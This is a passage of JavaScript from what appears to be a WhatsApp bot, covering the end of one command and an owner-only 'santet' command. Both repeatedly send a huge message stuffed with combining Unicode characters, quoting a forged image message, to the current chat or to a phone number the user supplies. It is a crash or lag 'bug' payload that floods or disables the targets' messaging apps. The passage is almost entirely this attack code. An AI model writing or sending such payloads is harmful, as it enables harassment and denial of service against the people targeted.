            await sleep(30000)
            await hisoka.sendMessage(m.chat, {text:"𑁔⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱͓͓ᰱᰱ𝟬͓͓݁݁݁݁݁݁݁݁݁݁ᰱᰱ𝟱͓͓ᰱᰱ 𝙨᰷᰷᰷݁݁𝙤᰷᰷᰷݁݁݁𝙥᰷᰷᰷݁݁݁݁݁𝙤᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙠᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁ 𝙖᰷᰷᰷݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙜᰷᰷᰷݁݁݁݁݁݁݁݁݁݁𝙚᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁♜⃤꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠⵰ INFINITE"},{quoted:asukonyol11})
            await sleep(30000)
            await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:"𑁔⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱͓͓ᰱᰱ𝟬͓͓݁݁݁݁݁݁݁݁݁݁ᰱᰱ𝟱͓͓ᰱᰱ 𝙨᰷᰷᰷݁݁𝙤᰷᰷᰷݁݁݁𝙥᰷᰷᰷݁݁݁݁݁𝙤᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙠᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁ 𝙖᰷᰷᰷݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙜᰷᰷᰷݁݁݁݁݁݁݁݁݁݁𝙚᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁♜⃤꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠⵰ INFINITE"},{quoted:asukonyol11})
            await sleep(30000)
            await hisoka.sendMessage(m.chat, {text:"𑁔⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱͓͓ᰱᰱ𝟬͓͓݁݁݁݁݁݁݁݁݁݁ᰱᰱ𝟱͓͓ᰱᰱ 𝙨᰷᰷᰷݁݁𝙤᰷᰷᰷݁݁݁𝙥᰷᰷᰷݁݁݁݁݁𝙤᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙠᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁ 𝙖᰷᰷᰷݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙜᰷᰷᰷݁݁݁݁݁݁݁݁݁݁𝙚᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁♜⃤꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠⵰ INFINITE"},{quoted:asukonyol11})
            await sleep(30000)
            await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:"𑁔⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱͓͓ᰱᰱ𝟬͓͓݁݁݁݁݁݁݁݁݁݁ᰱᰱ𝟱͓͓ᰱᰱ 𝙨᰷᰷᰷݁݁𝙤᰷᰷᰷݁݁݁𝙥᰷᰷᰷݁݁݁݁݁𝙤᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙠᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁ 𝙖᰷᰷᰷݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙜᰷᰷᰷݁݁݁݁݁݁݁݁݁݁𝙚᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁♜⃤꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠⵰ INFINITE"},{quoted:asukonyol11})
            await sleep(30000)
            await hisoka.sendMessage(m.chat, {text:"𑁔⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱͓͓ᰱᰱ𝟬͓͓݁݁݁݁݁݁݁݁݁݁ᰱᰱ𝟱͓͓ᰱᰱ 𝙨᰷᰷᰷݁݁𝙤᰷᰷᰷݁݁݁𝙥᰷᰷᰷݁݁݁݁݁𝙤᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙠᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁ 𝙖᰷᰷᰷݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙜᰷᰷᰷݁݁݁݁݁݁݁݁݁݁𝙚᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁♜⃤꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠⵰ INFINITE"},{quoted:asukonyol11})
            await sleep(30000)
            await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:"𑁔⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱͓͓ᰱᰱ𝟬͓͓݁݁݁݁݁݁݁݁݁݁ᰱᰱ𝟱͓͓ᰱᰱ 𝙨᰷᰷᰷݁݁𝙤᰷᰷᰷݁݁݁𝙥᰷᰷᰷݁݁݁݁݁𝙤᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙠᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁ 𝙖᰷᰷᰷݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙜᰷᰷᰷݁݁݁݁݁݁݁݁݁݁𝙚᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁♜⃤꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠⵰ INFINITE"},{quoted:asukonyol11})
            await sleep(30000)
            await hisoka.sendMessage(m.chat, {text:"𑁔⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱͓͓ᰱᰱ𝟬͓͓݁݁݁݁݁݁݁݁݁݁ᰱᰱ𝟱͓͓ᰱᰱ 𝙨᰷᰷᰷݁݁𝙤᰷᰷᰷݁݁݁𝙥᰷᰷᰷݁݁݁݁݁𝙤᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙠᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁ 𝙖᰷᰷᰷݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙜᰷᰷᰷݁݁݁݁݁݁݁݁݁݁𝙚᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁♜⃤꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠⵰ INFINITE"},{quoted:asukonyol11})
            await sleep(30000)
            await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:"𑁔⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱͓͓ᰱᰱ𝟬͓͓݁݁݁݁݁݁݁݁݁݁ᰱᰱ𝟱͓͓ᰱᰱ 𝙨᰷᰷᰷݁݁𝙤᰷᰷᰷݁݁݁𝙥᰷᰷᰷݁݁݁݁݁𝙤᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙠᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁ 𝙖᰷᰷᰷݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙜᰷᰷᰷݁݁݁݁݁݁݁݁݁݁𝙚᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁♜⃤꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠⵰ INFINITE"},{quoted:asukonyol11})
            await sleep(30000)
            await hisoka.sendMessage(m.chat, {text:"𑁔⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱͓͓ᰱᰱ𝟬͓͓݁݁݁݁݁݁݁݁݁݁ᰱᰱ𝟱͓͓ᰱᰱ 𝙨᰷᰷᰷݁݁𝙤᰷᰷᰷݁݁݁𝙥᰷᰷᰷݁݁݁݁݁𝙤᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙠᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁ 𝙖᰷᰷᰷݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙜᰷᰷᰷݁݁݁݁݁݁݁݁݁݁𝙚᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁♜⃤꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠⵰ INFINITE"},{quoted:asukonyol11})
            await sleep(30000)
            await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:"𑁔⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱͓͓ᰱᰱ𝟬͓͓݁݁݁݁݁݁݁݁݁݁ᰱᰱ𝟱͓͓ᰱᰱ 𝙨᰷᰷᰷݁݁𝙤᰷᰷᰷݁݁݁𝙥᰷᰷᰷݁݁݁݁݁𝙤᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙠᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁ 𝙖᰷᰷᰷݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙜᰷᰷᰷݁݁݁݁݁݁݁݁݁݁𝙚᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁♜⃤꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠⵰ INFINITE"},{quoted:asukonyol11})
            await sleep(30000)
            await hisoka.sendMessage(m.chat, {text:"𑁔⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱͓͓ᰱᰱ𝟬͓͓݁݁݁݁݁݁݁݁݁݁ᰱᰱ𝟱͓͓ᰱᰱ 𝙨᰷᰷᰷݁݁𝙤᰷᰷᰷݁݁݁𝙥᰷᰷᰷݁݁݁݁݁𝙤᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙠᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁ 𝙖᰷᰷᰷݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙜᰷᰷᰷݁݁݁݁݁݁݁݁݁݁𝙚᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁♜⃤꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠⵰ INFINITE"},{quoted:asukonyol11})
            await sleep(30000)
            }
            break
         case 'santet':               
          if (!isCreator) return
             asukonyol11 = { 
                    key: { 
                        fromMe: false, 
                        participant: `0@s.whatsapp.net`, 
                        ...({ remoteJid: "" }) 
                    }, 
                    message: { 
                        "imageMessage": { 
                            "mimetype": "image/jpeg", 
                            "caption": `𑁔⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱͓͓ᰱᰱ𝟬͓͓݁݁݁݁݁݁݁݁݁݁ᰱᰱ𝟱͓͓ᰱᰱ 𝙨᰷᰷᰷݁݁𝙤᰷᰷᰷݁݁݁𝙥᰷᰷᰷݁݁݁݁݁𝙤᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙠᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁ 𝙖᰷᰷᰷݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙜᰷᰷᰷݁݁݁݁݁݁݁݁݁݁𝙚᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁♜⃤꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠⵰ SANTET`,
                            "jpegThumbnail": thumb
                        } 
                    } 
                }
            await hisoka.sendMessage(m.chat, {text:"𑁔⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱͓͓ᰱᰱ𝟬͓͓݁݁݁݁݁݁݁݁݁݁ᰱᰱ𝟱͓͓ᰱᰱ 𝙨᰷᰷᰷݁݁𝙤᰷᰷᰷݁݁݁𝙥᰷᰷᰷݁݁݁݁݁𝙤᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙠᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁ 𝙖᰷᰷᰷݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙜᰷᰷᰷݁݁݁݁݁݁݁݁݁݁𝙚᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁♜⃤꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠⵰ SANTET"},{quoted:asukonyol11})
            await sleep(30000)
            await hisoka.sendMessage(m.chat, {text:"𑁔⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱͓͓ᰱᰱ𝟬͓͓݁݁݁݁݁݁݁݁݁݁ᰱᰱ𝟱͓͓ᰱᰱ 𝙨᰷᰷᰷݁݁𝙤᰷᰷᰷݁݁݁𝙥᰷᰷᰷݁݁݁݁݁𝙤᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙠᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁ 𝙖᰷᰷᰷݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙜᰷᰷᰷݁݁݁݁݁݁݁݁݁݁𝙚᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁♜⃤꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠⵰ SANTET"},{quoted:asukonyol11})
            await sleep(30000)
            await hisoka.sendMessage(m.chat, {text:"𑁔⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱͓͓ᰱᰱ𝟬͓͓݁݁݁݁݁݁݁݁݁݁ᰱᰱ𝟱͓͓ᰱᰱ 𝙨᰷᰷᰷݁݁𝙤᰷᰷᰷݁݁݁𝙥᰷᰷᰷݁݁݁݁݁𝙤᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙠᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁ 𝙖᰷᰷᰷݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙜᰷᰷᰷݁݁݁݁݁݁݁݁݁݁𝙚᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁♜⃤꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠⵰ SANTET"},{quoted:asukonyol11})
            await sleep(30000)
            await hisoka.sendMessage(m.chat, {text:"𑁔⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱͓͓ᰱᰱ𝟬͓͓݁݁݁݁݁݁݁݁݁݁ᰱᰱ𝟱͓͓ᰱᰱ 𝙨᰷᰷᰷݁݁𝙤᰷᰷᰷݁݁݁𝙥᰷᰷᰷݁݁݁݁݁𝙤᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙠᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁ 𝙖᰷᰷᰷݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙜᰷᰷᰷݁݁݁݁݁݁݁݁݁݁𝙚᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁♜⃤꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠⵰ SANTET"},{quoted:asukonyol11})
            await sleep(30000)
            await hisoka.sendMessage(m.chat, {text:"𑁔⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱͓͓ᰱᰱ𝟬͓͓݁݁݁݁݁݁݁݁݁݁ᰱᰱ𝟱͓͓ᰱᰱ 𝙨᰷᰷᰷݁݁𝙤᰷᰷᰷݁݁݁𝙥᰷᰷᰷݁݁݁݁݁𝙤᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙠᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁ 𝙖᰷᰷᰷݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙜᰷᰷᰷݁݁݁݁݁݁݁݁݁݁𝙚᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁♜⃤꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠⵰ SANTET"},{quoted:asukonyol11})
            await sleep(30000)
            await hisoka.sendMessage(m.chat, {text:"𑁔⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱͓͓ᰱᰱ𝟬͓͓݁݁݁݁݁݁݁݁݁݁ᰱᰱ𝟱͓͓ᰱᰱ 𝙨᰷᰷᰷݁݁𝙤᰷᰷᰷݁݁݁𝙥᰷᰷᰷݁݁݁݁݁𝙤᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙠᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁ 𝙖᰷᰷᰷݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙜᰷᰷᰷݁݁݁݁݁݁݁݁݁݁𝙚᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁♜⃤꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠⵰ SANTET"},{quoted:asukonyol11})
            await sleep(30000)
            await hisoka.sendMessage(m.chat, {text:"𑁔⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱͓͓ᰱᰱ𝟬͓͓݁݁݁݁݁݁݁݁݁݁ᰱᰱ𝟱͓͓ᰱᰱ 𝙨᰷᰷᰷݁݁𝙤᰷᰷᰷݁݁݁𝙥᰷᰷᰷݁݁݁݁݁𝙤᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙠᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁ 𝙖᰷᰷᰷݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙜᰷᰷᰷݁݁݁݁݁݁݁݁݁݁𝙚᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁♜⃤꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠⵰ SANTET"},{quoted:asukonyol11})
            await sleep(30000)
